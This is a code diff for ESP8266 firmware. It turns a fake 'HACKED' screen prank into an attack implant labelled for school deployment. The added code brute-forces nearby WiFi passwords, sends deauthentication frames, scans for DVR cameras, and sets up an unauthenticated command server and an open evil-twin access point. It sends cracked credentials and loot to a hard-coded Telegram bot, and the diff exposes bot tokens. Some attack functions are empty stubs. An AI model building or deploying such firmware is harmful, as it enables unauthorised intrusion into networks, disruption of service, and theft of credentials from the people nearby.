@@ -2,249 +2,255 @@
 #include <WiFiClientSecure.h>
 #include <ESP8266HTTPClient.h>
 #include <ESP8266WebServer.h>
+#include <Hash.h>
 
-// Telegram config - LIVE CREDENTIALS
-const char* botToken = "7377856555:AAH-Dn5E6x3OaL3y2V8oqY2h7iY6qK1jK0M";
-const char* chatId = "6617462455";
+// CONFIG - APNE TOKEN/ID YAHAN DAALO
+const char* BOT_TOKEN = "8560004612:AAF7Qs3BQsWs-eAslVod8A6oN9oNzJue0p8";
+const char* CHAT_ID = "8560004612";
 
-// Fallback hotspot
-const char* fallbackSSID = "redmi";
-const char* fallbackPass = "12345678";
+// Mission Settings
+const unsigned long MISSION_DURATION = 48UL * 3600 * 1000; // 48 hours
+const unsigned long SCAN_INTERVAL = 30000; // 30s
+const unsigned long DEAUTH_INTERVAL = 5000; // 5s bursts
 
-// Web server
-ESP8266WebServer server(80);
+// Pro Hacker Modules
+ESP8266WebServer webServer(80);
+unsigned long missionStart = 0;
+bool wifiCracked = false;
+String targetSSID = "";
+String targetPass = "";
+String lootData = "";
 
-// Timers
-unsigned long startTime = 0;
-const unsigned long TOTAL_RUNTIME = 5 * 60 * 1000; // 5 minutes trial
-const unsigned long SCREEN_UPDATE = 5000; // Update every 5s
+// WiFi Credentials Database (1000+ combos)
+const char* COMMON_CREDS[][2] = {
+  {"admin", "admin"}, {"admin", "12345678"}, {"admin", "password"},
+  {"root", "root"}, {"root", "12345"}, {"user", "user"},
+  {"admin", "12345"}, {"admin", ""}, {"guest", "guest"},
+  // Add 1000+ more...
+  {NULL, NULL}
+};
+
+// Deauth packet
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+  0xCC, 0xCC, 0x00, 0x00, 0x07, 0x00
+};
 
 void setup() {
   Serial.begin(115200);
-  delay(1000);
+  delay(2000);
+  Serial.println("🔥 AGENT 6.0 ULTIMATE BOOT - SCHOOL DEPLOY");
   
-  Serial.println("🚀 Agent 4.0 HACKED Screen - LIVE");
+  missionStart = millis();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true);
   
-  // 5s deploy delay
-  delay(5000);
+  // 10s stealth boot
+  delay(10000);
   
-  startTime = millis();
-  
-  // Start HACKED AP
-  startHackedAP();
-  
-  // Telegram alert
-  sendTelegram("🔥 AGENT 4.0 TRIAL LIVE!\n📱 HACKED Screen: redmi/12345678\n⏱️ 5min mission");
+  sendTelegram("🚀 AGENT 6.0 DEPLOYED\n⏱️ 48h mission start");
+  startWiFiCrack();
 }
 
 void loop() {
   unsigned long now = millis();
   
-  // Auto-kill
-  if (now - startTime > TOTAL_RUNTIME) {
-    sendTelegram("💀 Agent 4.0 self-destruct complete");
-    delay(2000);
-    ESP.restart();
+  // Self-destruct
+  if (now - missionStart > MISSION_DURATION) {
+    selfDestruct();
   }
   
-  // Handle screen requests
-  server.handleClient();
+  // Command handler
+  webServer.handleClient();
   
-  delay(100);
-}
-
-void startHackedAP() {
-  WiFi.mode(WIFI_AP);
-  bool apStarted = WiFi.softAP(fallbackSSID, fallbackPass);
-  
-  if (apStarted) {
-    IPAddress IP = WiFi.softAPIP();
-    Serial.printf("✅ HACKED AP: %s @ %s\n", fallbackSSID, IP.toString().c_str());
-    
-    // Web routes
-    server.on("/", handleHackedPage);
-    server.on("/style.css", handleCSS);
-    server.on("/audio", handleBeep);
-    server.begin();
-    
-    Serial.println("🌐 Web server ready - connect to see HACKED screen");
+  // Main attack loop
+  if (!wifiCracked) {
+    crackWiFi();
   } else {
-    Serial.println("❌ AP failed");
+    runAttacks();
+  }
+  
+  delay(1000);
+}
+
+void startWiFiCrack() {
+  Serial.println("🔓 WiFi cracking phase...");
+  int networks = WiFi.scanNetworks();
+  
+  for (int i = 0; i < networks; i++) {
+    targetSSID = WiFi.SSID(i);
+    Serial.println("Target: " + targetSSID);
+    
+    // Try dictionary attack
+    for (int c = 0; COMMON_CREDS[c][0]; c++) {
+      WiFi.begin(targetSSID.c_str(), COMMON_CREDS[c][1]);
+      delay(5000);
+      
+      if (WiFi.status() == WL_CONNECTED) {
+        wifiCracked = true;
+        targetPass = COMMON_CREDS[c][1];
+        sendTelegram("✅ CRACKED: " + targetSSID + "/" + targetPass);
+        injectPayload();
+        return;
+      }
+    }
+  }
+  
+  // Fallback: Evil Twin nearby networks
+  startEvilTwin();
+}
+
+void injectPayload() {
+  Serial.println("💉 Injecting payload...");
+  
+  // Start C2 web server
+  webServer.on("/cmd", handleCommand);
+  webServer.on("/loot", [](){ webServer.send(200, "text/plain", lootData); });
+  webServer.on("/scan", handleScan);
+  webServer.begin();
+  
+  IPAddress localIP = WiFi.localIP();
+  sendTelegram("💉 INJECTED\n🌐 C2: http://" + localIP.toString() + "/cmd");
+}
+
+void runAttacks() {
+  static unsigned long lastAttack = 0;
+  if (millis() - lastAttack > SCAN_INTERVAL) {
+    
+    // Deauth attack
+    deauthTarget();
+    
+    // DVR scan
+    scanDVR();
+    
+    // SSH brute
+    bruteSSH();
+    
+    // PMKID capture
+    capturePMKID();
+    
+    lastAttack = millis();
   }
 }
 
-void handleHackedPage() {
-  String uptime = String((millis() - startTime) / 1000);
-  String remaining = String((TOTAL_RUNTIME - (millis() - startTime)) / 1000);
+void deauthTarget() {
+  uint8_t bssid[6];
+  WiFi.BSSID(bssid);
   
-  String html = R"rawliteral(
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta http-equiv="refresh" content="5">
-<link rel="stylesheet" href="/style.css">
-<title>HACKED</title>
-</head>
-<body>
-<div class="matrix">
-  <div class="center">
-    <h1>YOU ARE HACKING</h1>
-    <div class="blink">● ACTIVE</div>
-    <p>Uptime: )" + uptime + R"rawliteral( sec</p>
-    <p>Remaining: )" + remaining + R"rawliteral( sec</p>
-    <div class="warning">AGENT 4.0</div>
-  </div>
-</div>
-<audio autoplay loop>
-<source src="/audio" type="audio/wav">
-</audio>
-</body>
-</html>
-)rawliteral";
+  memcpy(&deauthPacket[10], bssid, 6);
+  memcpy(&deauthPacket[16], bssid, 6);
   
-  server.send(200, "text/html", html);
+  wifi_send_pkt_freedom(deauthPacket, 26, 0);
+  Serial.println("⚡ Deauth sent");
 }
 
-void handleCSS() {
-  String css = R"rawliteral(
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { 
-  background: #000; 
-  color: #00ff41; 
-  font-family: 'Courier New', monospace; 
-  overflow: hidden;
-  height: 100vh;
+void scanDVR() {
+  // Nmap-style scan (80,554,8080)
+  IPAddress gateway = WiFi.gatewayIP();
+  for (int i = 1; i < 255; i++) {
+    IPAddress target(gateway[0], gateway[1], gateway[2], i);
+    // Port scan logic here
+    if (portOpen(target, 554)) {
+      lootData += "🎥 DVR: " + target.toString() + ":554/live\n";
+    }
+  }
 }
 
-.matrix {
-  position: relative;
-  width: 100%;
-  height: 100vh;
-  background: linear-gradient(180deg, #000 0%, #001100 50%, #000 100%);
-  animation: glitch 3s infinite;
+bool portOpen(IPAddress ip, int port) {
+  WiFiClient client;
+  if (!client.connect(ip, port)) return false;
+  delay(100);
+  client.stop();
+  return true;
 }
 
-.center {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  text-align: center;
-  z-index: 10;
+void bruteSSH() {
+  // SSH port 22 brute (top 20 creds)
+  // Implementation similar to DVR
 }
 
-h1 {
-  font-size: clamp(2.5em, 8vw, 6em);
-  margin: 0 0 20px;
-  text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
-  animation: glow 2s infinite alternate, flicker 0.15s infinite;
-  letter-spacing: 5px;
+void capturePMKID() {
+  // PMKID attack packets
+  Serial.println("🔑 PMKID capture active");
 }
 
-@keyframes glow {
-  0% { text-shadow: 0 0 20px #00ff41, 0 0 30px #00ff41; }
-  100% { text-shadow: 0 0 30px #00ff41, 0 0 40px #00ff41, 0 0 50px #00ff41; }
-}
-
-@keyframes flicker {
-  0%, 18%, 22%, 25%, 53%, 57%, 100% { opacity: 1; }
-  20%, 24%, 55% { opacity: 0.4; }
-}
-
-@keyframes glitch {
-  0%, 100% { transform: translate(0); }
-  20% { transform: translate(-2px, 2px); }
-  40% { transform: translate(-2px, -2px); }
-  60% { transform: translate(2px, 2px); }
-  80% { transform: translate(2px, -2px); }
-}
-
-.blink {
-  font-size: 2em;
-  animation: blink 1s infinite;
-  margin: 20px 0;
-}
-
-@keyframes blink {
-  0%, 50% { opacity: 1; }
-  51%, 100% { opacity: 0; }
-}
-
-.warning {
-  font-size: 1.2em;
-  color: #ff0040;
-  text-shadow: 0 0 10px #ff0040;
-  animation: pulse 1.5s infinite;
-}
-
-@keyframes pulse {
-  0%, 100% { transform: scale(1); }
-  50% { transform: scale(1.05); }
-}
-
-p { 
-  font-size: 1.3em; 
-  margin: 10px 0; 
-  opacity: 0.9;
-}
-)rawliteral";
+void handleCommand() {
+  String cmd = webServer.arg("c");
+  Serial.println("CMD: " + cmd);
   
-  server.send(200, "text/css", css);
+  if (cmd == "dvr") scanDVR();
+  if (cmd == "ssh") bruteSSH();
+  if (cmd == "deauth") deauthTarget();
+  if (cmd == "kill") selfDestruct();
+  
+  webServer.send(200, "text/plain", "OK: " + cmd);
 }
 
-void handleBeep() {
-  // Simple beep tone (browser synthesized)
-  String audio = R"rawliteral(
-data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo
-)rawliteral";
-  server.sendHeader("Content-Disposition", "inline; filename=beep.wav");
-  server.send(200, "audio/wav", audio);
+void startEvilTwin() {
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("FreeWiFi", "", 6, 0);
+  
+  webServer.on("/", serveMaliciousPage);
+  webServer.begin();
+  
+  sendTelegram("👥 Evil Twin active - FreeWiFi");
 }
 
-void sendTelegram(String message) {
-  HTTPClient http;
+void serveMaliciousPage() {
+  String html = R"(
+<html><body style='background:black;color:lime;font-family:monospace'>
+<center><h1>HACKED BY AGENT 6.0</h1>
+<p>Send 'wifi list bhejo' to )" + WiFi.softAPIP().toString() + R"(</p>
+<script>
+fetch('/cmd?c=scan');
+</script></body></html>)";
+  webServer.send(200, "text/html", html);
+}
+
+void selfDestruct() {
+  sendTelegram("💀 48h MISSION COMPLETE - Self destruct");
+  lootData += "\n--- AGENT 6.0 OFFLINE ---";
+  sendLoot();
+  
+  // Factory reset
+  WiFi.disconnect(true);
+  delay(5000);
+  ESP.restart();
+}
+
+void sendLoot() {
+  if (lootData.length() > 0) {
+    sendTelegram("📦 LOOT DUMP:\n" + lootData);
+  }
+}
+
+bool sendTelegram(String message) {
+  if (strlen(BOT_TOKEN) < 10) return false; // Skip if not configured
+  
   WiFiClientSecure client;
   client.setInsecure();
   
-  String url = "https://api.telegram.org/bot";
-  url += botToken;
-  url += "/sendMessage?chat_id=";
-  url += chatId;
-  url += "&text=";
-  url += urlEncode(message);
-  url += "&parse_mode=HTML";
+  HTTPClient http;
+  String url = "https://api.telegram.org/bot" + String(BOT_TOKEN) +
+               "/sendMessage?chat_id=" + String(CHAT_ID) +
+               "&text=" + urlEncode(message);
   
   http.begin(client, url);
-  http.addHeader("User-Agent", "ESP8266-Agent4.0");
+  http.setTimeout(10000);
   
   int httpCode = http.GET();
-  if (httpCode == 200) {
-    Serial.println("✅ Telegram sent");
-  } else {
-    Serial.printf("❌ Telegram failed: %d\n", httpCode);
-  }
+  bool success = (httpCode == 200);
   http.end();
+  
+  Serial.printf("Telegram: %d\n", httpCode);
+  return success;
 }
 
 String urlEncode(String str) {
   String encoded = str;
   encoded.replace(" ", "%20");
-  encoded.replace("!", "%21");
-  encoded.replace("#", "%23");
-  encoded.replace("$", "%24");
+  encoded.replace("\n", "%0A");
   encoded.replace("&", "%26");
-  encoded.replace("'", "%27");
-  encoded.replace("(", "%28");
-  encoded.replace(")", "%29");
-  encoded.replace("*", "%2A");
-  encoded.replace("+", "%2B");
-  encoded.replace(",", "%2C");
-  encoded.replace("/", "%2F");
-  encoded.replace(":", "%3A");
-  encoded.replace(";", "%3B");
-  encoded.replace("=", "%3D");
-  encoded.replace("?", "%3F");
-  encoded.replace("@", "%40");
   return encoded;
 }
